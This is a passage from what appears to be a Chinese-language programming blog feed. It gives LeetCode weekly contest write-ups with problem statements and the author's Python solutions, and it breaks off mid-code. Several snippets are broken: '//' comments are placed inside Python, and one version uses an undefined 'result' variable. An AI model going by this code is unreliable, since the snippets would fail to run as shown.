title="相同元素的间隔之和"></a>相同元素的间隔之和</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从 0 开始、由 n 个整数组成的数组 arr 。</span><br><span class="line">arr 中两个元素的间隔定义为它们下标之间的 绝对差 。更正式地，arr[i]和arr[j] 之间的间隔是 |i - j|。</span><br><span class="line">返回一个长度为 n 的数组 intervals ，其中 intervals[i] 是 arr[i] 和 arr 中每个相同元素（与 arr[i] 的值相同）的 间隔之和 。</span><br><span class="line">注意：|x| 是 x 的绝对值。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [2,1,3,1,2,3,3]</span><br><span class="line">输出：[4,2,7,2,4,4,5]</span><br><span class="line">解释：</span><br><span class="line">- 下标 0 ：另一个 2 在下标 4 ，|0 - 4| = 4</span><br><span class="line">- 下标 1 ：另一个 1 在下标 3 ，|1 - 3| = 2</span><br><span class="line">- 下标 2 ：另两个 3 在下标 5 和 6 ，|2 - 5| + |2 - 6| = 7</span><br><span class="line">- 下标 3 ：另一个 1 在下标 1 ，|3 - 1| = 2</span><br><span class="line">- 下标 4 ：另一个 2 在下标 0 ，|4 - 0| = 4</span><br><span class="line">- 下标 5 ：另两个 3 在下标 2 和 6 ，|5 - 2| + |5 - 6| = 4</span><br><span class="line">- 下标 6 ：另两个 3 在下标 2 和 5 ，|6 - 2| + |6 - 5| = 5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [10,5,10,10]</span><br><span class="line">输出：[5,0,3,4]</span><br><span class="line">解释：</span><br><span class="line">- 下标 0 ：另两个 10 在下标 2 和 3 ，|0 - 2| + |0 - 3| = 5</span><br><span class="line">- 下标 1 ：只有这一个 5 在数组中，所以到相同元素的间隔之和是 0</span><br><span class="line">- 下标 2 ：另两个 10 在下标 0 和 3 ，|2 - 0| + |2 - 3| = 3</span><br><span class="line">- 下标 3 ：另两个 10 在下标 0 和 2 ，|3 - 0| + |3 - 2| = 4</span><br></pre></td></tr></table></figure><p>现在再看这道题，多么熟悉！由于我之前并没有做过1685这道题，所以我早上比赛的时候一脸懵逼，但是还是硬着头皮写了一下。我先讲一下我没有做1685这道题之前做这个题的思路。</p><ul><li>首先我肯定需要分组，按照相同的数字将他们的下标分在一组。</li><li>其次针对每一组数我都需要计算他们各自和组里其他数的绝对值之和。</li></ul><p>于是我写了如下代码，其中我通过字典的key来保存数字，value来保存数字的下标。之后对字典的value进行遍历，去计算组内每个数和其他数之间的绝对值之和。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[i] <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[arr[i]] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[arr[i]].append(i)</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> d.values():</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> value:</span><br><span class="line">                s = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> r <span class="keyword">in</span> value:</span><br><span class="line">                    s+=abs(v-r)</span><br><span class="line">                res[v] = s</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>最终还是超时了。。。。。</p><p>当我做了1685这道题之后，我明白了我需要改进的地方。对于字典分组这一块还是不需要改变的，只需要改进后面计算绝对值之和。改进后的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[i] <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[arr[i]] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[arr[i]].append(i)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>最终还是超时了。。。。。</p><p>我突然感觉眼前一片黑暗，这特么也能超时？？？于是我打算优化一下前面字典分组这一块，优化代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[v] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[v].append(i)</span><br><span class="line">        result = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>梅开三度，还是超时。。。于是我看了一下题解是怎么写的。其中有一个<code>python</code>的解法跟我这个差不太多，我借用了一下人家对于字典分组这块的写法，最终代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        d = collections.defaultdict(list)</span><br><span class="line">        ans = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i , v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">          d[v].append(i)</span><br><span class="line">        result = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>终于通过了😭😭😭，特么的，同样都是字典，为啥原生的字典和<code>collections</code>模块中的字典差距就这么大呢。。。</p><p><img src="/2021/12/26/Leetcode第273场周赛write-up/2.png" alt="2"></p><h4 id="还原原数组"><a href="#还原原数组" class="headerlink" title="还原原数组"></a>还原原数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Alice 有一个下标从 0 开始的数组 arr ，由 n 个正整数组成。她会选择一个任意的 正整数 k 并按下述方式创建两个下标从 0 开始的新整数数组 lower 和 higher ：</span><br><span class="line">对每个满足 0 &lt;= i &lt; n 的下标 i ，lower[i] = arr[i] - k</span><br><span class="line">对每个满足 0 &lt;= i &lt; n 的下标 i ，higher[i] = arr[i] + k</span><br><span class="line">不幸地是，Alice 丢失了全部三个数组。但是，她记住了在数组 lower 和 higher 中出现的整数，但不知道每个整数属于哪个数组。请你帮助 Alice 还原原数组。</span><br><span class="line">给你一个由 2n 个整数组成的整数数组 nums ，其中 恰好 n 个整数出现在 lower ，剩下的出现在 higher ，还原并返回 原数组 arr 。如果出现答案不唯一的情况，返回 任一 有效数组。</span><br><span class="line">注意：生成的测试用例保证存在 至少一个 有效数组 arr 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [2,10,6,4,8,12]</span><br><span class="line">输出：[3,7,11]</span><br><span class="line">解释：</span><br><span class="line">如果 arr = [3,7,11] 且 k = 1 ，那么 lower = [2,6,10] 且 higher = [4,8,12] 。</span><br><span class="line">组合 lower 和 higher 得到 [2,6,10,4,8,12] ，这是 nums 的一个排列。</span><br><span class="line">另一个有效的数组是 arr = [5,7,9] 且 k = 3 。在这种情况下，lower = [2,4,6] 且 higher = [8,10,12] 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [1,1,3,3]</span><br><span class="line">输出：[2,2]</span><br><span class="line">解释：</span><br><span class="line">如果 arr = [2,2] 且 k = 1 ，那么 lower = [1,1] 且 higher = [3,3] 。</span><br><span class="line">组合 lower 和 higher 得到 [1,1,3,3] ，这是 nums 的一个排列。</span><br><span class="line">注意，数组不能是 [1,3] ，因为在这种情况下，获得 [1,1,3,3] 唯一可行的方案是 k = 0 。</span><br><span class="line">这种方案是无效的，k 必须是一个正整数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [5,435]</span><br><span class="line">输出：[220]</span><br><span class="line">解释：</span><br><span class="line">唯一可行的组合是 arr = [220] 且 k = 215 。在这种情况下，lower = [5] 且 higher = [435] 。</span><br></pre></td></tr></table></figure><p>这道题嘛！告辞。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;反转两次的数字&quot;&gt;&lt;a href=&quot;#反转两次的数字&quot; class=&quot;headerlink&quot; title=&quot;反转两次的数字&quot;&gt;&lt;/a&gt;反转两次的数字&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第272场周赛write up</title>
    <link href="elssm.github.io/2021/12/19/Leetcode%E7%AC%AC272%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/12/19/Leetcode第272场周赛write-up/</id>
    <published>2021-12-19T04:42:32.000Z</published>
    <updated>2021-12-20T09:29:16.797Z</updated>
    
    <content type="html"><![CDATA[<h4 id="找出数组中的第一个回文字符串"><a href="#找出数组中的第一个回文字符串" class="headerlink" title="找出数组中的第一个回文字符串"></a>找出数组中的第一个回文字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给你一个字符串数组 words ，找出并返回数组中的 第一个回文字符串 。如果不存在满足要求的字符串，返回一个 空字符串 &quot;&quot; 。</span><br><span class="line">回文字符串 的定义为：如果一个字符串正着读和反着读一样，那么该字符串就是一个 回文字符串 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;abc&quot;,&quot;car&quot;,&quot;ada&quot;,&quot;racecar&quot;,&quot;cool&quot;]</span><br><span class="line">输出：&quot;ada&quot;</span><br><span class="line">解释：第一个回文字符串是 &quot;ada&quot; 。</span><br><span class="line">注意，&quot;racecar&quot; 也是回文字符串，但它不是第一个。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;notapalindrome&quot;,&quot;racecar&quot;]</span><br><span class="line">输出：&quot;racecar&quot;</span><br><span class="line">解释：第一个也是唯一一个回文字符串是 &quot;racecar&quot; 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;def&quot;,&quot;ghi&quot;]</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：不存在回文字符串，所以返回一个空字符串。</span><br></pre></td></tr></table></figure><p>这道没什么说的，依次遍历每一个字符串取反后进行比较，如果相等直接返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">firstPalindrome</span><span class="params">(self, words)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type words: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            r_word = word[::<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> r_word == word:</span><br><span class="line">                <span class="keyword">return</span> word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure><h4 id="向字符串添加空格"><a href="#向字符串添加空格" class="headerlink" title="向字符串添加空格"></a>向字符串添加空格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从 0 开始的字符串 s ，以及一个下标从 0 开始的整数数组 spaces。</span><br><span class="line">数组 spaces 描述原字符串中需要添加空格的下标。每个空格都应该插入到给定索引处的字符值之前。</span><br><span class="line">例如，s = &quot;EnjoyYourCoffee&quot; 且 spaces = [5, 9] ，那么我们需要在 &apos;Y&apos; 和 &apos;C&apos; 之前添加空格，这两个字符分别位于下标 5 和下标 9 。因此，最终得到 &quot;Enjoy Your Coffee&quot; 。</span><br><span class="line">请你添加空格，并返回修改后的字符串。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;LeetcodeHelpsMeLearn&quot;, spaces = [8,13,15]</span><br><span class="line">输出：&quot;Leetcode Helps Me Learn&quot;</span><br><span class="line">解释：</span><br><span class="line">下标 8、13 和 15 对应 &quot;LeetcodeHelpsMeLearn&quot; 中加粗斜体字符。</span><br><span class="line">接着在这些字符前添加空格。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;icodeinpython&quot;, spaces = [1,5,7,9]</span><br><span class="line">输出：&quot;i code in py thon&quot;</span><br><span class="line">解释：</span><br><span class="line">下标 1、5、7 和 9 对应 &quot;icodeinpython&quot; 中加粗斜体字符。</span><br><span class="line">接着在这些字符前添加空格。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;spacing&quot;, spaces = [0,1,2,3,4,5,6]</span><br><span class="line">输出：&quot; s p a c i n g&quot;</span><br><span class="line">解释：</span><br><span class="line">字符串的第一个字符前可以添加空格。</span><br></pre></td></tr></table></figure><p>这道题的思路是：根据要插入空格的地方将字符串进行拆分，将拆分后的字符串通过空格连接即可。这里要注意<code>spaces</code>第一个位置和最后一个位置的处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addSpaces</span><span class="params">(self, s, spaces)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type spaces: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(spaces)):</span><br><span class="line">          //处理spaces第一个位置</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                res.append(s[<span class="number">0</span>:spaces[<span class="number">0</span>]])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(s[spaces[i<span class="number">-1</span>]:spaces[i]])</span><br><span class="line">        //处理spaces最后一个位置</span><br><span class="line">        <span class="keyword">if</span> spaces[<span class="number">-1</span>]&lt;len(s):</span><br><span class="line">            res.append(s[spaces[<span class="number">-1</span>]:])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">" "</span>.join(res)</span><br></pre></td></tr></table></figure><h4 id="股票平滑下跌阶段的数目"><a href="#股票平滑下跌阶段的数目" class="headerlink" title="股票平滑下跌阶段的数目"></a>股票平滑下跌阶段的数目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数数组 prices ，表示一支股票的历史每日股价，其中 prices[i] 是这支股票第 i 天的价格。</span><br><span class="line">一个 平滑下降的阶段 定义为：对于 连续一天或者多天 ，每日股价都比 前一日股价恰好少 1 ，这个阶段第一天的股价没有限制。</span><br><span class="line">请你返回 平滑下降阶段 的数目。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：prices = [3,2,1,4]</span><br><span class="line">输出：7</span><br><span class="line">解释：总共有 7 个平滑下降阶段：</span><br><span class="line">[3], [2], [1], [4], [3,2], [2,1] 和 [3,2,1]</span><br><span class="line">注意，仅一天按照定义也是平滑下降阶段。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：prices = [8,6,7,7]</span><br><span class="line">输出：4</span><br><span class="line">解释：总共有 4 个连续平滑下降阶段：[8], [6], [7] 和 [7]</span><br><span class="line">由于 8 - 6 ≠ 1 ，所以 [8,6] 不是平滑下降阶段。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：prices = [1]</span><br><span class="line">输出：1</span><br><span class="line">解释：总共有 1 个平滑下降阶段：[1]</span><br></pre></td></tr></table></figure><p>这道题思路也比较简单，首先我们考虑一下，对于连续1天，则可以得到平滑下降的阶段是1个，对于连续2天，则可以得到平滑下降的阶段是3个，假如<code>prices=[2,1]</code>，则阶段值为<code>[2],[1],[2,1]</code>，对于连续3天，则可以得到平滑下降的阶段是6个，假如<code>prices=[3,2,1]</code>，则阶段值为<code>[3],[2],[1],[3,2],[2,1],[3,2,1]</code>，这样我们就可以找到规律，对于连续n天，平滑下降的阶段是<code>1+2+...+n</code>的值。</p><p>所以我们可以依次遍历<code>prices</code>中的值，找到每一个连续平滑阶段，并根据每一个阶段中的值计算数目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDescentPeriods</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(prices) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        res = []</span><br><span class="line">        tmp=[]</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        i=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(prices):</span><br><span class="line">          //如果前一个比后一个多<span class="number">1</span>，则他们属于一个平滑阶段</span><br><span class="line">            <span class="keyword">if</span> prices[i<span class="number">-1</span>]-prices[i] == <span class="number">1</span>:</span><br><span class="line">                tmp.append(prices[i<span class="number">-1</span>])</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              //这里因为前一个值还没有加入到tmp中，因此先添加前一个值</span><br><span class="line">                tmp.append(prices[i<span class="number">-1</span>])</span><br><span class="line">                ////先把之前的平滑阶段保存起来</span><br><span class="line">                res.append(tmp)</span><br><span class="line">                //判断后续的平滑阶段，因此tmp置为空</span><br><span class="line">                tmp=[]</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">          //如果tmp中有值，那说明最后一段没有加入到res中</span><br><span class="line">            res.append(tmp)</span><br><span class="line">        //如果prices中最后一个值比倒数第二个值小<span class="number">1</span>，则最后一个值属于倒数第二个tmp平滑阶段</span><br><span class="line">        <span class="keyword">if</span> prices[<span class="number">-2</span>] - prices[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">            res[<span class="number">-1</span>].append(prices[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          //否则的话最后一个值单独组成一个平滑阶段</span><br><span class="line">            res.append([prices[<span class="number">-1</span>]])</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">          //计算累加和</span><br><span class="line">          result += (<span class="number">1</span>+len(r))*len(r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>做最后这道题之前，我们先做一下<code>Leetcode</code>第300题，最长递增子序列。</p><h4 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数数组 nums ，找到其中最长严格递增子序列的长度。</span><br><span class="line">子序列是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，[3,6,2,7] 是数组 [0,3,1,6,2,2,7] 的子序列。</span><br></pre></td></tr></table></figure><figure class="highlight 